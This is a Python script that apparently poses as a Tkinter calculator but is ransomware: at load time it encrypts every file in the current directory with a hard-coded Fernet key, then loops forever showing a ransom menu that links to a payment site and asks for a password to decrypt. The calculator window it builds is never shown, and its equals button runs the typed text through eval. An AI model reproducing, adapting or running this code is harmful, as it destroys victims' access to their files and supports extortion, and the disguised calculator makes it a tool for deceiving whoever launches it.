import tkinter as tk
import tkinter.messagebox
from tkinter.constants import SUNKEN

import os
from os import system,name
import webbrowser
import time
from cryptography.fernet import Fernet

ar=['Pays a ransom','About jd','Decrypted']
green = "\033[32m"
blue = "\033[34m"
red = "\033[31m"
bold = "\033[1m"
end = "\033[0m"
files=[]
def another(key):
    
    try:
    
     for f in files:
        with open(f,'rb') as file:
         txt=file.read()
        txt_dec=Fernet(key).decrypt(txt)
        with open(f,'wb') as file:
            file.write(txt_dec)
    except:
    
        i=0
def decryp(key):
    final='This is ransomware project'
    pas=input(green+'Enter password : ')
    if pas!=final:
        print(green+'Enter the Correct password!!')
        time.sleep(5)
        clean()
        paint(key)
        return
  
    try:
     for f in files:
        with open(f,'rb') as file:
         txt=file.read()
        txt_dec=Fernet(key).decrypt(txt)
        with open(f,'wb') as file:
            file.write(txt_dec)
    except:
        i=0        
    finally:
        print(green+'Great,All files will decrypted,'+red+'Enjoy')
        time.sleep(5)
        quit()
def enc(key):
    for f in  files:
     with open(f,'rb') as file:
        txt=file.read()
     txt_enc=Fernet(key).encrypt(txt)
     with open(f,'wb') as file:
        file.write(txt_enc)

def clean():
    if name=='nt':
        _=system('cls')
    else:
        _=system('clear')
def paint(key):
    print(green+"""
          
              |
              |
          ----+----          ---------
              |                                   
              |
   )                                           (
   \ \                                       / /
    \ |\                                   / |/
     \|  \           ransomzaid~         /   /
      \   |\         --------          / |  /
       \  |  \_________/    /________/     /
        \ |    |      |      |      |    |/
         \|    |      |      |      |    /
          \____|______|______|______|___/
          
          """
          +end)
    for j in range(3):
        print(red+str(j+1)+'.'+ar[j])
    i=input(green+'Choose Your option: ')
    if i!='1' and i!='2' and i!='3':
        print(green+'hhhhh Are you seriously?\nI will ask you again!!')
        time.sleep(5)
        return 
    i=int(i)
    if i==1:
        webbrowser.get('firefox').open('https://ransomezaid.000webhostapp.com/')
    elif i==2:
        webbrowser.get('firefox').open('https://www.investopedia.com/terms/j/jod.asp')
    else:
        decryp(key)

window = tk.Tk()
window.title('Calculator-GeeksForGeeks')
frame = tk.Frame(master=window, bg="skyblue", padx=10)
frame.pack()
entry = tk.Entry(master=frame, relief=SUNKEN, borderwidth=3, width=30)
entry.grid(row=0, column=0, columnspan=3, ipady=2, pady=2)


def myclick(number):
	entry.insert(tk.END, number)


def equal():
	try:
		y = str(eval(entry.get()))
		entry.delete(0, tk.END)
		entry.insert(0, y)
	except:
		tkinter.messagebox.showinfo("Error", "Syntax Error")


def clear():
	entry.delete(0, tk.END)


button_1 = tk.Button(master=frame, text='1', padx=15,
					pady=5, width=3, command=lambda: myclick(1))
button_1.grid(row=1, column=0, pady=2)
button_2 = tk.Button(master=frame, text='2', padx=15,
					pady=5, width=3, command=lambda: myclick(2))
button_2.grid(row=1, column=1, pady=2)
button_3 = tk.Button(master=frame, text='3', padx=15,
					pady=5, width=3, command=lambda: myclick(3))
button_3.grid(row=1, column=2, pady=2)
button_4 = tk.Button(master=frame, text='4', padx=15,
					pady=5, width=3, command=lambda: myclick(4))
button_4.grid(row=2, column=0, pady=2)
button_5 = tk.Button(master=frame, text='5', padx=15,
					pady=5, width=3, command=lambda: myclick(5))
button_5.grid(row=2, column=1, pady=2)
button_6 = tk.Button(master=frame, text='6', padx=15,
					pady=5, width=3, command=lambda: myclick(6))
button_6.grid(row=2, column=2, pady=2)
button_7 = tk.Button(master=frame, text='7', padx=15,
					pady=5, width=3, command=lambda: myclick(7))
button_7.grid(row=3, column=0, pady=2)
button_8 = tk.Button(master=frame, text='8', padx=15,
					pady=5, width=3, command=lambda: myclick(8))
button_8.grid(row=3, column=1, pady=2)
button_9 = tk.Button(master=frame, text='9', padx=15,
					pady=5, width=3, command=lambda: myclick(9))
button_9.grid(row=3, column=2, pady=2)
button_0 = tk.Button(master=frame, text='0', padx=15,
					pady=5, width=3, command=lambda: myclick(0))
button_0.grid(row=4, column=1, pady=2)

button_add = tk.Button(master=frame, text="+", padx=15,
					pady=5, width=3, command=lambda: myclick('+'))
button_add.grid(row=5, column=0, pady=2)

button_subtract = tk.Button(
	master=frame, text="-", padx=15, pady=5, width=3, command=lambda: myclick('-'))
button_subtract.grid(row=5, column=1, pady=2)

button_multiply = tk.Button(
	master=frame, text="*", padx=15, pady=5, width=3, command=lambda: myclick('*'))
button_multiply.grid(row=5, column=2, pady=2)

button_div = tk.Button(master=frame, text="/", padx=15,
					pady=5, width=3, command=lambda: myclick('/'))
button_div.grid(row=6, column=0, pady=2)

button_clear = tk.Button(master=frame, text="clear",
						padx=15, pady=5, width=12, command=clear)
button_clear.grid(row=6, column=1, columnspan=2, pady=2)

button_equal = tk.Button(master=frame, text="=", padx=15,
						pady=5, width=9, command=equal)
button_equal.grid(row=7, column=0, columnspan=3, pady=2)

for f in os.listdir():
    if f !="RANSOM.py" and os.path.isfile(f):
        files.append(f)
key=b'DTIWkYOlkUNeCtRrnRi2BNSO6fL8aCLM05W4BNrI0to='
another(key)
enc(key)
paint(key)
while 1:
    clean()
    paint(key)

window.mainloop()